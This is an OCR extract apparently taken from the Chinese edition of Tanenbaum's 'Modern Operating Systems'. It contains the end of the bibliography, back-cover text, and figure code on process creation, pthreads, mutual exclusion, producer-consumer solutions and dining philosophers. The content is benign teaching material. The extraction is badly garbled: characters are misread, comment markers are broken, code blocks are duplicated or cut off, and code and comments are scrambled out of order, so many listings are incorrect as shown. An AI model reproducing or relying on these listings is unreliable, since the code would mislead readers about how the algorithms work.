Workloads:The Case for New NAS Benchmarks,"Proc.11th Conf.on File and Stor- age Technologies,USENIX,2013.
TEORY,TJ: “Properties of Disk Scheduling Policies in Multiprogrammed Computer Sys- tems,"Proc.AFIPS Fall Joint Computer Conf.,AFIPS,pp.1-11,1972.
THEODOROU,D.,MAK,R.H,KEIJSER,JJ.,and SUERINK,R.: “NRS:A System for
Automated Network Virtualization in IAAS Cloud Infrastructures,"Proc.Seventh Int'l Workshop on Virtualization Tech.in Distributed Computing,ACM,pp.25-32,2013.
THIBADEAU,R.:"Trusted Computing for Disk Drives and Other Peripherals,"IEEE Secu- rity and Privacy,vol.4,pp.26-33,Sept./Oct.2006.
THOMPSON,K.: "Reflections on Trusting Trust,"Commun.of the ACM,vol.27,pp.
761-763,Aug.1984.
TIMCENKO,V.,and DJORDJEVIC,B.: “The Comprehensive Performance Analysis of Striped Disk Array Organizations—RAID-0,"Proc.2013 Int'I Conf.on Inf.Systems and Design of Commun.,ACM,pp.113-116,2013.
TRESADERN,P.,COOTES,T.,POH,N.,METEJKA,P.,HADID,A.,LEVY,C.,McCOOL ,
C.,and MARCEL,S.:"Mobile Biometrics:Combined Face and Voice Verification for a
Mobile Platform,"IEEE Pervasive Computing,vol.12,pp.79-87,Jan.2013.
TSAFRIR,D.,ETSION,Y.,FEITELSON,D.G.,and KIRKPATRICK,S:“System Noise,OS Clock Ticks,and Fine-Grained Parallel Applications,"Proc.19th Ann.Int'l Conf.on Supercomputing,ACM,pp.303-312,2005.
TUAN-ANH,B.,HUNG,P.P.,and HUH,E.-N.:“A Solution of Thin-Thick Client Collabora- tion for Data Distribution and Resource Allocation in Cloud Computing,"Proc.2013 Int'Conf.on Inf.Networking,IEEE,pp.238-243,2103.
TUCKER,A.,and GUPTA,A.: "Process Control and Scheduling Issues for Multipro- grammed Shared-Memory Multiprocessors,"Proc.12th Symp.on Operating Systems Principles,ACM,pp.159-166,1989.
UHLIG,R.,NAGLE,D.,STANLEY,T.,MUDGE,T,SECREST,S.,and BROWN,R.:"Design Tradeoffs for Software-Managed TLBs,"ACM Trans.on Computer Systems,vol.12, pp.175-205,Aug.1994.
UHLIG,R.NEIGER,G.,RODGERS,D.,SANTONI,A.L.,MARTINS,F.C.M.,ANDERSON,
A.V.,BENNET,S.M.,KAGI,A.,LEUNG,F.H.,and SMITH,L.:"Intel Virtualization Technology,"Computer,vol.38,pp.48-56,2005.
UR,B.,KELLEY,P.G.,KOMANDURI,S.,LEE,J.,MAASS,M.,MAZUREK,M.L.,PAS-
SARO,T.,SHAY,R.,VIDAS,T.,BAUER,L.,CHRISTIN,N.,and CRANOR,L.E:"How Does Your Password Measure Up?
The Effect of Strength Meters on Password Cre- ation,"Proc.21st USENIX Security Symp.,USENIX,2012.
VAGHANI,S.B.:“Virtual Machine File System,”ACM SIGOPS Operating Systems Rev, vol.44,pp.57-70,2010.
VAHALIA,U.:UNIX Internals—The New Frontiers,Upper Saddle River,NJ:Prentice Hall, 2007.
VAN DOORN,L.:The Design and Application of an Extensible Operating System,Capelle a/d Ijssel:Labyrint Publications,2001.
VAN MOOLENBROEK,D.C.,APPUSWAMY,R.,and TANENBAUM,A.S:"Integrated Sys- tem and Process Crash Recovery in the Loris Storage Stack,"Proc.Seventh Int'Conf. on Networking,Architecture,and Storage,IEEE,pp.1-10,2012.
VAN’T NOORDENDE,G.,BALOGH,A.,HOFMAN,R.,BRAZIER,F.M.T.,and TANEN-
BAUM,A.S.: "A Secure Jailing System for Confining Untrusted Applications,"Proc.
Second Int'7 Conf.on Security and Cryptography,INSTICC,pp.414423,2007.
VASWANI,R.,and ZAHORJAN,J.: “The Implications of Cache Affinity on Processor Scheduling for Multiprogrammed Shared-Memory Multiprocessors,"Proc.13th Symp. on Operating Systems Principles,ACM,pp.26-40,1991.
VAN DER VEEN,V.,DDUTT-SHARMA, N.,CAVALLARO,L.,and BOS,H.:"Memory
Errors:The Past,the Present,and the Future,”Proc.15th Int'7 Conf.on Research in
Attacks,Intrusions,and Defenses,Berlin:Springer-Verlag,pp.86-106,2012.
VENKATACHALAM,V.,and FRANZ,M:“Power Reduction Techniques for Microproces- sor Systems,"Computing Surveys,vol.37,pp.195-237,Sept.2005.
VIENNOT,N.,NAIR,S.,and NIEH,J.:“Transparent Mutable Replay for Multicore Debug- ging and Patch Validation,"Proc.18th Int'l Conf.on Arch.Support for Prog.Lang. and Operating Systems,ACM,2013.
VINOSKI,S.: “CORBA:Integrating Diverse Applications within Distributed Heteroge-
neous Environments,"IEEE Communications Magazine,vol.35,pp.46-56,Feb. 1997.
VISCAROLA,P.G,MASON,T,CARIDDI,M.,RYAN,B.,and NOONE,S.:Introduction to the Windows Driver Foundation Kernel-Mode Framework,Amherst,NH:OSR Press, 2007.
VOGELS,W.:"File System Usage in Windows NT 4.0,"Proc.17th Symp.on Operating Systems Principles,ACM,pp.93-109,1999.
VON BEHREN,R.,CONDIT,J.,and BREWER,E:“Why Events Are A Bad Idea(for High- Concurrency Servers),”Proc.Ninth Workshop on Hot Topics in Operating Systems, USENIX,pp.19-24,2003.
VON EICKEN,T,CULLER,D.,GOLDSTEIN,S.C.,and SCHAUSER,K.E:“Active Mes- sages:A Mechanism for Integrated Communication and Computation,”Proc.19th Int'Symp.on Computer Arch.,ACM,pp.256-266,1992.
VOSTOKOV,D.: Windows Device Drivers:Practical Foundations,Opentask,2009.
VRABLE,M.,SAVAGE,S.,and VOELKER,G.M.: "BlueSky:A Cloud-Backed File System for the Enterprise,"Proc.10th USENIX Conf.on File and Storage Tech.,USENIX,pp. 124-250,2012.
WAHBE,R.,LUCCO,S.,ANDERSON,T.,and GRAHAM,S:"Efficient Software-Based
Fault Isolation,"Proc.14th Symp.on Operating Systems Principles,ACM,pp. 203-216,1993.
WALDSPURGER,C.A.:"Memory Resource Management in VMware ESX Server,"ACM SIGOPS Operating System Rev,vol 36,pp.181-194,Jan.2002.
WALDSPURGER,C.A.,and ROSENBLUM,M:"I/O Virtualization,"Commun.of the ACM,vol.55,pp.66-73,2012.
WALDSPURGER,C.A.,and WEIHL,W.E.:"Lottery Scheduling:Flexible Proportional- Share Resource Management,"Proc.First Symp.on Operating Systems Design and Implementation,USENIX,pp.1-12,1994.
WALKER,W.,and CRAGON,H.G.:"Interrupt Processing in Concurrent Processors,"Com- puter,vol.28,pp.36-46,June 1995.
WALLACE,G.,DOUGLIS,E.,QIAN,H.,SHILANE,P,SMALDONE,S.,CHAMNESS,M. , and HSU.,W.:“Characteristics of Backup Workloads in Production Systems,”Proc. 10th USENIX Conf.on File and Storage Tech., USENIX,pp.33-48,2012.
WANG,L.,KHAN,S.U.,CHEN,D.,KOLODZIEJ,J.,RANJAN,R.,XU,C.-Z.,and ZOMAYA, A.:"Energy-Aware Parallel Task Scheduling in a Cluster,"Future Generation Com- puter Systems,vol.29,pp.1661-1670,Sept.2013b.
WANG,X.,TIPPER,D.,and KRISHNAMURTHY,P.:"Wireless Network Virtualization,"
2013a.
WANG,Y.and LU,P.:"DDS:A Deadlock Detection-Based Scheduling Algorithm for Workflow Computations in HPC Systems with Storage Constraints,"Parallel Comput., vol.39,pp.291-305,August 2013.
WATSON,R.,ANDERSON,J.,LAURIE,B.,and KENNAWAY,K.:"A Taste of Capsicum: Practical Capabilities for UNIX,”Commun.of the ACM,vol.55,pp.97-104,March 2013.
WEI,M.,GRUPP,L.,SPADA,F.E.,and SWANSON,S.:"Reliably Erasing Data from Flash- Based Solid State Drives,"Proc.Ninth USENIX Conf.on File and Storage Tech., USENIX,pp.105-118,2011.
WEI,Y.-H.,YANG,C.-Y.,KUO,T-W.,HUNG,S.-H.,and CHU,Y.-H.:“Energy-Efficient Real-Time Scheduling of Multimedia Tasks on Multi-core Processors,”Proc.2010 Symp.on Applied Computing,ACM,pp.258-262,2010.
WEISER,M.,WELCH,B.,DEMERS,A.,and SHENKER,S.:"Scheduling for Reduced CPU Energy,”Proc.First Symp.on Operating Systems Design and Implementation, USENIX,pp.13-23,1994.
WEISSEL,A.:Operating System Services for Task-Specific Power Management:Novel
Approaches to Energy-Aware Embedded Linux,AV Akademikerverlag,2012.
WENTZLAFF,D.,GRUENWALD Ⅲ,C.,BECKMANN,N.,MODZELEWSKI,K.,BELAY, A.,YOUSEFF,L.,MILLER,J.,and AGARWAL,A.:“An Operating System for Multi- core and Clouds:Mechanisms and Implementation,"Proc.Cloud Computing,ACM, June 2010.
WENTZLAFF,D.,JACKSON,CJ.,GRIFFIN,P.,and AGARWAL,A.:“Configurable Fine- grain Protection for Multicore Processor Virtualization,"Proc.39th Int'Symp.on Computer Arch.,ACM,pp.464-475,2012.
WHITAKER,A„COX,R.S.,SHAW,M,and GRIBBLE,S.D.:"Rethinking the Design of Vir- tual Machine Monitors,"Computer,vol.38,pp.57-62,May 2005.
WHITAKER,A.,SHAW,M,and GRIBBLE,S.D.:"Scale and Performance in the Denali Iso-
lation Kernel,"ACM SIGOPS Operating Systems Rev,vol.36,pp.195-209,Jan.
2002.
WILLIAMS,D.,JAMJOOM,H.,and WEATHERSPOON,H.:“The Xen-Blanket:Virtualize Once,Run Everywhere,"Proc.Seventh European Conf.on Computer Systems (EUROSYS),ACM,2012.
WIRTH,N.:"A Plea for Lean Software,"Computer,vol.28,pp.64-68,Feb.1995.
WU,N.,ZHOU,M.,and HU, U.:“One-Step Look-Ahead Maximally Permissive Deadlock Control of AMS by Using Petri Nets,"ACM Trans.Embed.Comput.Syst.,#,vol.12, Art.10,pp.10:1-10:23,Jan.2013.
WULF,W.A,COHEN,E.S.,CORWIN,W.M.,JONES,A.K.,LEVIN,R.,PIERSON,C.,and
POLLACK,E.J.:"HYDRA:The Kernel of a Multiprocessor Operating System,"Com- mun.of the ACM,vol.17,pp.337-345,June 1974.
YANG,J.,TWOHEY,P.,ENGLER,D.,and MUSUVATHI,M.:"Using Model Checking to Find Serious File System Errors,”ACM Trans.on Computer Systems,vol.24,pp. 393-423,2006.
YEH,T.,and CHENG,W.: "Improving Fault Tolerance through Crash Recovery,"Proc.
2012 Int'Symp.on Biometrics and Security Tech.,IEEE,pp.15-22,2012.
YOUNG,M.,TEVANIAN,A.,Jr.,RASHID,R.,GOLUB,D.,EPPINGER,J.,CHEW,J.,
BOLOSKY,W.,BLACK,D.,and BARON,R.:"The Duality of Memory and Communi- cation in the Implementation of a Multiprocessor Operating System,"Proc.11th Symp. on Operating Systems Principles,ACM,pp.63-76,1987.
YUAN,D.,LEWANDOWSKI,C,and CROSS,B.:"Building a Green Unified Computing IT Laboratory through Virtualization,"J.Computing Sciences in Colleges,vol.28,pp. 76-83,June 2013.
YUAN,J.,JIANG,X.,ZHONG,L.,and YU,H.:“Energy Aware Resource Scheduling Algo-
rithm for Data Center Using Reinforcement Learning,"Proc.Fifth Int'l Conf.on Intel-
ligent Computation Tech.and Automation,IEEE,pp.435-438,2012.
YUAN,W.,and NAHRSTEDT,K.:“Energy-Efficient CPU Scheduling for Multimedia Sys-
tems,"ACM Trans.on Computer Systems,ACM,vol.24,pp.292-331,Aug.2006.
ZACHARY,G.P:Showstopper,New York:Maxwell Macmillan,1994.
ZAHORJAN,J.,LAZOWSKA,E.D.,and EAGER,D.L:"The Effect of Scheduling Disci- pline on Spin Overhead in Shared Memory Parallel Systems,"IEEE Trans.on Parallel and Distr:Systems,vol.2,pp.180-198,April 1991.
ZEKAUSKAS,M.J.,SAWDON,W.A.,and BERSHAD,B.N.:"Software Write Detection for a Distributed Shared Memory,"Proc.First Symp.on Operating Systems Design and Implementation,USENIX,pp.87-100,1994.
ZHANG,C.,WEI,T.,CHEN,Z,DUAN,L.,SZEKERES,L.,MCCAMANT,S.,SONG,D.,and
ZOU,W.: “Practical Control Flow Integrity and Randomization for Binary Executa-
bles,"Proc.IEEE Symp.on Security and Privacy,IEEE,pp.559-573,2013b.
ZHANG,F.,CHEN,J.,CHEN,H.,and ZANG,B.: “CloudVisor:Retrofitting Protection of Virtual Machines in Multi-Tenant Cloud with Nested Virtualization,"Proc.23rd Symp. on Operating Systems Principles,ACM,2011.
ZHANG,M.,and SEKAR,R.: “Control Flow Integrity for COTS Binaries,”Proc.22nd USENZX Security Symp.,USENIX,pp.337-352,2013.
ZHANG,X.,DAVIS,K.,and JIANG, S.:“iTransformer:Using SSD to Improve Disk
Scheduling for High-Performance I/O,”Proc,26th Int'7 Parallel and Distributed Pro- cessing Symp.,IEEE,pp.715-726,2012b.
ZHANG,Y.,LIU,J.,and KANDEMIR,M.: "Software-Directed Data Access Scheduling for Reducing Disk Energy Consumption,"Proc.32nd Int'Conf.on Distributed Computer Systems,IEEE,pp.596-605,2012a.
ZHANG,Y.,SOUNDARARAJAN,G.,STORER,M.W.,BAIRAVASUNDARAM,L.,SUB-
ZHENG,H.,ZHANG,X,WANG,E.,WU,N.,and DONG,X.:“Achieving High Reliability
on Linux for K2 System,"Proc.1Ith Int'T Conf.on Computer and Information Sci- ence,IEEE,pp.107-112,2012.
ZHOU,B.,KULKARNI,M.,and BAGCHI,S.:“ABHRANTA:Locating Bugs that Manifest at Large System Scales,”Proc.Eighth USENIX Workshop on Hot Topics in System Dependability,USENIX,2012.
ZHURAVLEV,S.,SAEZ,J.C.,BLAGODUROV,S.,FEDOROVA,A.,and PRIETO,M.:“Sur- vey of scheduling techniques for addressing shared resources in multicore processors," Computing Surveys,ACM,vol 45,Number 1,Art.4,2012.
ZOBEL,D.:“The Deadlock Problem:A Classifying Bibliography,”ACM SIGOPS Operat- ing Systems Rev,vol.17,pp.6-16,Oct.1983.
ZUBERI,K.M.,PILLAI,P.,and SHIN,K.G.:“EMERALDS:A Small-Memory Real-Time
Microkernel,"Proc.17th Symp.on Operating Systems Principles,ACM,pp.277-299,
1999.
ZWICKY,E.D.: “Torture-Testing Backup and Archive Programs:Things You Ought to Know But Probably Would Rather Not,"Proc.Fifih Conf.on Large Installation Sys- tems Admin.,USENIX,pp.181-190,1991.
现 代 操 作 系 统原书第4版
Modern Operating Systems Fourth Edition
第4版重要更新
●新增一章讨论虚拟化和云，新增一节讲解Android操作系统，新增研究实例Windows 8。
此外，安全 方面还引入了攻击和防御技术的新知识。
作者简介
安德鲁 S. 塔嫩鲍姆 (Andrew S.Tanenbaum) 阿姆斯特丹自由大学教授，荷兰皇家艺 术与科学院教授。
他撰写的计算机教材享誉全球，被翻译为20种语言在各国大学中使用。
他开 发的MINI 操作系统是一个开源项目，专注于高可靠性、灵活性及安全性。
他曾赢得享有盛名 的欧洲研究理事会卓越贡献奖，以及ACM和IEEE的诸多奖项。
Pearson
中断
控制器
4 磁 盘 控制器 2
调 用 说 明
pid=fork() 创建与父进程相同的子进程
pid=waitpid(pid,&statloc,options) 等待一个子进程终止
s=execve(name,argv,environp) 替换一个进程的核心映像
exit(status) 终止进程执行并返回状态
调 用 说 明
fd=open(file,how,...) 打开一个文件供读、写或两者
s=close(fd) 关闭一个打开的文件
n=read(fd,buffer,nbytes) 把数据从一个文件读到缓冲区中
n=write(fd,buffer,nbytes) 把数据从缓冲区写到一个文件中
position =Iseek(fd,offset,whence) 移动文件指针
S=stat(name,&buf) 取得文件的状态信息
调 用 说 明
S=mkdir(name,mode) 创建一个新目录
S=rmdir(name) 删去一个空目录
s=link(name1,name2) 创建一个新目录项name2,并指向namel
S=unlink(name) 删去一个目录项
s=mount(special,name,flag) 安装一个文件系统
S=umount(special) 卸载一个文件系统
调 用 说 明
s=chdir(dirname) 改变工作目录
s=chmod(name,mode) 修改一个文件的保护位
s=kill(pid,signal) 发送信号给一个进程
seconds =time(&seconds) 自1970年1月1日起的流逝时间
#define TRUE 1
while(TRUE){
type_prompt();
read_command(command,parameters);
if(fork()!
=0){
1*父代码*/
waitpid(-1,&status,O);
}else {
/*子代码*/
execve(command,parameters,O); }
{ /*一直循环下去*/
1*在屏幕上显示提示符*/ /*从终端读取输入*/
1*派生子进程*/
/*等待子进程退出*/
/*执行命令*/
UNIX Win32 说 明
fork CreateProcess 创建一个新进程
waitpid WaitForSingleObject 等待一个进程退出
execve (none) CreateProcess=fork+execve
exit ExitProcess 终止执行
open CreateFile 创建一个文件或打开一个已有的文件
close CloseHandle 关闭一个文件
read ReadFile 从一个文件读数据
write WriteFile 把数据写入一个文件
Iseek SetFilePointer 移动文件指针
stat GetFileAttributesEx 取得文件的属性
mkdir CreateDirectory 创建一个新目录
rmdir RemoveDirectory 删除一个空目录
link (none) Win32不支持link
unlink DeleteFile 销毁一个已有的文件
mount (none) Win32不支持mount
umount (none) Win32不支持umount
chdir SetCurrentDirectory 改变当前工作目录
chmod (none) Win32不支持安全性(但NT支持)
kill (none) Win32不支持信号
time GetLocalTime 获得当前时间
指数 具体表示 前缀 指数 具体表示 前缀
10³ 0.001 milli 10³ 1000 Kilo
10-⁶ 0.000001 micro 10⁶ 1000000 Mega
10-9 0.000000001 nano 10⁹ 1000000000 Giga
10-12 0.000000000001 pico 10¹² 1000000000000 Tera
10-15 0.000000000000001 femto 1015 1000000000000000 Peta
10-18 0.0000000000000000001 atto 1018 1000000000000000000 Exa
10-²1 0.0000000000000000000001 zepto 10²1 1000000000000000000000 Zetta
10-²4 0.0000000000000000000000001 yocto 10²⁴ 1000000000000000000000000 Yotta
0 1 ·· n-2 n-1
调度程序 调度程序 调度程序 调度程序 调度程序
进程管理
寄存器
程序计数器 程序状态字 堆栈指针
进程状态 优先级
调度参数 进程ID
父进程 进程组 信号
进程开始时间
使用的CPU时间
子进程的CPU时间 下次定时器时间 存储管理
正文段指针 数据段指针 堆栈段指针 文件管理
根目录
工作目录
文件描述符 用户ID
组ID
1.硬件压入堆栈程序计数器等。
2.硬件从中断向量装入新的程序计数器。
3.汇编语言过程保存寄存器值。
4.汇编语言过程设置新的堆栈。
6.调度程序决定下一个将运行的进程。
7.C过程返回至汇编代码。
8.汇编语言过程开始运行新的当前进程。
模型 特性
多线程 并行性、阻塞系统调用
单线程进程 无并行性、阻塞系统调用
有限状态机 并行性、非阻塞系统调用、中断
每个进程中的内容 地址空间
全局变量
打开文件
子进程
即将发生的定时器
信号与信号处理程序 账户信息 每个线程中的内容
程序计数器 寄存器
堆栈
状态
线程调用 描 述
pthread_create 创建一个新线程
pthread_exit 结束调用的线程
pthread_join 等待一个特定的线程退出
pthread_yield 释放CPU来运行另外一个线程
pthread_attr_init 创建并初始化一个线程的属性结构
pthread_attr_destroy 删除一个线程的属性结构
#include <pthread.h> #include <stdio.h>
#include <stdlib.h>
#define NUMBER_OF_THREADS 10
void*print_hello_world(void*tid)
/"本函数输出线程的标识符，然后退出。
*1
printf("Hello World.Greetings from thread %dn",tid);
pthread_exit(NULL); }
int main(int argc,char*argv[])
/主程序创建10个线程，然后退出。
*1
pthread_t threads[NUMBER_OF_THREADS];
int status,i;
for(i=0;i<NUMBER_OF_THREADS;i++){
printf("Main here.Creating thread%dn",i);
status=pthread_create(&threads[i],NULL,print_hello_world,(void*)i);
if(status !
=0){
printf("Oops.pthread_create returned error code %dn",status); exit(-1);
}
}
exit(NULL); }
线程1的代码
线程2的代码
线程1的堆栈
线程2的堆栈
线程1的全局变量
线程2的全局变量
#define FALSE 0
#define TRUE 1
#define N 2
int turn;
int interested[N];
void enter_region(int process) {
int other;
other=1-process;
interested[process]=TRUE;
turn =process;
while(turn ==process }
void leave_region(int process) / * 进 程 数 量 * /
/ * 现 在 轮 到 谁 ?
* /
1 * 所 有 值 初 始 化 为 0 ( F A L S E ) * /
1 * 进 程 是 0 或 1 * /
1 * 另 一 进 程 号 * /
/ * 另 一 个 进 程 * / / * 表 示 感 兴 趣 * / / * 设 置 标 志 * /
&&interested[other]==TRUE);/*空语句*/
/ * 进 程 ： 谁 离 开 ?
* /
interested[process]=FALSE; / * 表 示 离 开 临 界 区 * /
{ interested[process]=FALSE; / * 表 示 离 开 临 界 区 * /
{
enter_region:
TSL REGISTER,LOCK !
复制锁到寄存器并将锁设为1
CMP REGISTER,#0 锁是零吗?
JNE enter_region 若不是零，说明锁已被设置，所以循环
RET 返回调用者，进入了临界区
leave_region:
MOVE LOCK,#0 !
在锁中存入0
RET 返回调用者
enter_region:
MOVE REGISTER,#1 |在寄存器中放一个1
XCHG REGISTER,LOCK |交换寄存器与锁变量的内容
CMP REGISTER,#0 |锁是零吗?
JNE enter_region |若不是零，说明锁已被设置，因此循环
RET |返回调用者，进入临界区 enter_region:
MOVE REGISTER,#1 |在寄存器中放一个1
XCHG REGISTER,LOCK |交换寄存器与锁变量的内容
CMP REGISTER,#0 |锁是零吗?
JNE enter_region |若不是零，说明锁已被设置，因此循环
RET |返回调用者，进入临界区
leave_region:
MOVE LOCK,#0 RET |在锁中存入0 |返回调用者
#define N 100
int count =0;
void producer(void) {
int item;
while(TRUE){
item=produce_item();
if(count ==N)sleep();
insert_item(item);
count=count+1;
if(count ==1)wakeup(consumer); }
void consumer(void) {
int item;
while(TRUE){
if (count==0)sleep();
item=remove_item();
count =count-1;
if (count==N-1)wakeup(producer); consume_item(item);
}
} /*缓冲区中的槽数目*/
/*缓冲区中的数据项数目*/
/*无限循环*/
/*产生下一新数据项*/
/*如果缓冲区满了，就进入休眠状态*/ /*将(新)数据项放入缓冲区中*/
/*将缓冲区的数据项计数器增1*/ /*缓冲区空吗?
*/
/*无限循环*/
/*如果缓冲区空，则进入休眠状态*/ 1*从缓冲区中取出一个数据项*/
1*将缓冲区的数据项计数器减1*/ /*缓冲区满吗?
*/
/*打印数据项*/
#define N 100
typedef int semaphore; semaphore mutex=1;
semaphore empty =N;
semaphore full=0;
void producer(void) {
int item;
while(TRUE){
item=produce_item(); down(&empty);
down(&mutex);
insert_item(item); up(&mutex);
up(&full); /*缓冲区中的槽数目*/
/*信号量是一种特殊的整型数据*/ 1*控制对临界区的访问*/
/*计数缓冲区的空槽数目*/ 1*计数缓冲区的满槽数目*/
1*TRUE是常量1*/
/*产生放在缓冲区中的一些数据*/ /*将空槽数目减1*/
1*进入临界区*/
/*将新数据项放到缓冲区中*/ /*离开临界区*/
} }
void consumer(void) {
int item;
while(TRUE){
down(&full); down(&mutex);
item=remove_item(); up(&mutex);
up(&empty);
consume_item(item); }
} 1*无限循环*/
1*将满槽数目减1*/ 1*进入临界区*/
/*从缓冲区中取出数据项*/ /*离开临界区*/
/*处理数据项*/
mutex_lock:
TSL REGISTER,MUTEX CMP REGISTER,#0
JZE ok
CALL thread_yield
JMP mutex_lock ok:RET 1将互斥信号量复制到寄存器，并且将互斥信号量置为1 1互斥信号量是0吗?
1如果互斥信号量为0,它被解锁，所以返回 1互斥信号量忙；调度另一个线程
稍后再试
I返回调用者；进入临界区
mutex_unlock:
MOVE MUTEX,#0 将mutex置为0
RET 1返回调用者 mutex_unlock:
MOVE MUTEX,#0 将mutex置为0
RET 1返回调用者
线程调用 描 述
pthread_mutex_init 创建一个互斥量
pthread_mutex_destroy 撤销一个已存在的互斥量
pthread_mutex_lock 获得一个锁或阻塞
pthread_mutex_trylock 获得一个锁或失败
pthread_mutex_unlock 释放一个锁
线程调用 描 述
pthread_cond_init 创建一个条件变量
pthread_cond_destroy 撤销一个条件变量
pthread_cond_wait 阻塞以等待一个信号
pthread_cond_signal 向另一个线程发信号 来唤醒它
pthread_cond_broadcast 向多个线程发信号来 让它们全部唤醒
#include <stdio.h>
#include <pthread.h>
#define MAX 1000000000 pthread_mutex_t the_mutex; pthread_cond_t condc,condp; int buffer=0;
void*producer(void*ptr) { int i; / 需 要 生 产 的 数 量 *
/ 生 产 者 消 费 者 使 用 的 缓 冲 区 * 1 / 生 产 数 据 * 1
pthread_exit(O); }
void *consumer(void *ptr) / 消 费 数 据 * 1
( int i;
for(i=1;i<=MAX;i++){
pthread_mutex_lock(&the_mutex); / * 互 斥 使 用 缓 冲 区 * /
while(buffer ==0)pthread_cond_wait(&condc,&the_mutex);
buffer=0; / * 从 缓 冲 区 中 取 出 数 据 * /
pthread_cond_signal(&condp); / 唤 醒 生 产 者 * /
p thread_mutex_unlock(&the_mutex);/*释放缓冲区*/ }
pthread_exit(O); }
int main(int argc,char "argv)
pthread_t pro,con;
pthread_mutex_init(&the_mutex,0);
pthread_cond_init(&condc,O);
pthread_cond_init(&condp,0);
pthread_create(&con,0,consumer,O);
pthread_create(&pro,0,producer,O);
pthread_join(pro,O);
pthread_join(con,O);
pthread_cond_destroy(&condc);
pthread_cond_destroy(&condp);
pthread_mutex_destroy(&the_mutex); } pthread_exit(O); }
void *consumer(void *ptr) / 消 费 数 据 * 1
( int i;
for(i=1;i<=MAX;i++){
pthread_mutex_lock(&the_mutex); / * 互 斥 使 用 缓 冲 区 * /
while(buffer ==0)pthread_cond_wait(&condc,&the_mutex);
buffer=0; / * 从 缓 冲 区 中 取 出 数 据 * /
pthread_cond_signal(&condp); / 唤 醒 生 产 者 * /
p thread_mutex_unlock(&the_mutex);/*释放缓冲区*/ }
pthread_exit(O); }
int main(int argc,char "argv)
pthread_t pro,con;
pthread_mutex_init(&the_mutex,0);
pthread_cond_init(&condc,O);
pthread_cond_init(&condp,0);
pthread_create(&con,0,consumer,O);
pthread_create(&pro,0,producer,O);
pthread_join(pro,O);
pthread_join(con,O);
pthread_cond_destroy(&condc);
pthread_cond_destroy(&condp);
pthread_mutex_destroy(&the_mutex); }
monitor ProducerConsumer
condition full,empty; integer count;
procedure insert(item;integer);
begin
if count=N then wait(full);
insert_item(item);
count :=count+1;
if count=I then signal(empty) end;
function remove:integer;
begin
if count=0 then wait(empty); remove=remove_item;
count :=count-1;
if count=N-1 then signal(full) end;
count :=0;
end monitor;
procedure producer;
begin
while true do
begin
item=produce_item;
ProducerConsumer.insert(item) end
end;
procedure consumer;
begin
while true do
begin
item=ProducerConsumer.remove; consume_item(item)
end
end;
public class ProducerConsumer{
static final int N=100; / / 定 义 缓 冲 区 大 小 的 常 量
static producer p=new producer();//初始化一个新的生产者线程 static consumer c=new consumer();//初始化一个新的消费者线程 static our_monitor mon=new our_monitor();ll初始化一个新的管程
public static void main(String args[】){
p.start();/Ⅱ开始生产者线程
c . star();/开始消费者线程
}
static class producer extends Thread{
public void run(){//run方法包含了线程代码
int item;
while (true){//生产者循环
item=produce_item();
mon.insert(item);
}
}
private int produce_item(){….} 1 1 . 实 际 生 产
}
static class consumer extends Thread{
public void run(){//run方法包含了线程代码
int item;
while (true){//消费者循环
item=mon.remove();
consume_item (item);
}
}
private void consume_item(int item)..}1实际消费
static class our_monitor{//这是一个管程
private int buffer[]=new int[N];
private int count=0,lo=0,hi=0;//计数器和索引
public synchronized void insert(int val){
if(count ==N)go_ to sleep();l1如果缓冲区满，则进入休眠 buffer [hi]=val;//向缓冲区中插入一个新的数据项
hi=(hi+1)%N; //设置下 一 个数据项的槽
count=count +1; /缓冲区中的数据项又多了 一 项
if (count==1)notify(); 1 如 果 消 费 者 在 休 眠 ， 则 将 其 唤 醒
}
public synchronized int remove(){
int val;
if(count ==0)go_ to_ sleep();Ⅱ如果缓冲区空，进入休眠 val=buffer [lo];//从缓冲区中取出一个数据项
lo=(lo+1)%N; / 设 置 待 取 数 据 项 的 槽
count=count-1; / / 缓 冲 区 中 的 数 据 项 数 目 减 少 1
if (count==N-1)notify();I1如果生产者在休眠，则将其唤醒
return val;
private void go_to_sleep(){try{wait();}catch(InterruptedException exc)0 }
}
#define N 100 /*缓冲区中的槽数目*/
void producer(void) {
int item;
message m; 1*消息缓冲区*/
while(TRUE){
item=produce_item(); /*产生放入缓冲区的一些数据*/
receive(consumer,&m); 1*等待消费者发送空缓冲区*/
build_message(&m,item); /*建立一个待发送的消息*/
send(consumer,&m); /*发送数据项给消费者*/ {
}
void consumer(void) {
int item,i;
message m;
for(i=0;i<N;i++)send(producer,&m);/*发送N个空缓冲区*/
while(TRUE){
receive(producer,&m); /*接收包含数据项的消息*/
item=extract_item(&m); 1*将数据项从消息中提取出来*/
send(producer,&m); /*将空缓冲区发送回生产者*/
} consume_item(item); 1*处理数据项*/
}
所有系统
公平——给每个进程公平的CPU份额
策略强制执行——保证规定的策略被执行
平衡——保持系统的所有部分都忙碌 批处理系统
吞吐量——每小时最大作业数
周转时间——从提交到终止间的最小时间 CPU利用率——保持CPU始终忙碌
交互式系统
响应时间——快速响应请求
均衡性——满足用户的期望 实时系统
满足截止时间——避免丢失数据
可预测性——在多媒体系统中避免品质降低
A B C D
#define N5
void philosopher(int i) {
while(TRUE){
think();
take_fork(i);
take_fork((i+1)%N); eat();
put_fork(i);
put_fork((i+1)%N); }
} /*哲学家的数目*/
/*i:哲学家编号，从0到4*/ /*哲学家在思考*/
1*拿起左边叉子*/
1*拿起右边叉子，%是模运算*/ 1*进食*/
/*将左叉放回桌上*/
/*将右叉放回桌上*/
#define N 5
#define LEFT (i+N-1)%N
#define RIGHT (i+1)%N
#define THINKING 0
#define HUNGRY 1
#define EATING 2
typedef int semaphore; int state[N];
semaphore mutex=1;
semaphore s[N];
void philosopher(int i) {
while(TRUE){
}
{
void take_forks(int i) {
down(&mutex);
state[i]=HUNGRY;
test(i);
up(&mutex);
down(&s[i); }
void put_forks(i) {
down(&mutex);
state[i]=THINKING;
test(LEFT);
test(RIGHT);
up(&mutex); } 1*哲学家数目*/
/*i的左邻居编号*/
/*i的右邻居编号*/
/*哲学家在思考*/
1*哲学家试图拿起叉子*/ /*哲学家进餐*/
/*信号量是一种特殊的整型数据*/
/*数组用来跟踪记录每位哲学家的状态*/ /*临界区的互斥*/
/*每个哲学家一个信号量*/
/*i:哲学家编号，从0到N-1*/ 1*无限循环*/
/*i:哲学家编号，从0到N-1*/
1*进入临界区*/
/*记录哲学家i处于饥饿的状态*/ 1*尝试获取2把叉子*/
1*离开临界区*/
1*如果得不到需要的叉子则阻塞*/
/*i:哲学家编号，从0到N-1*/
/*进入临界区*/
/*哲学家已经就餐完毕*/
/*检查左边的邻居现在可以吃吗*/
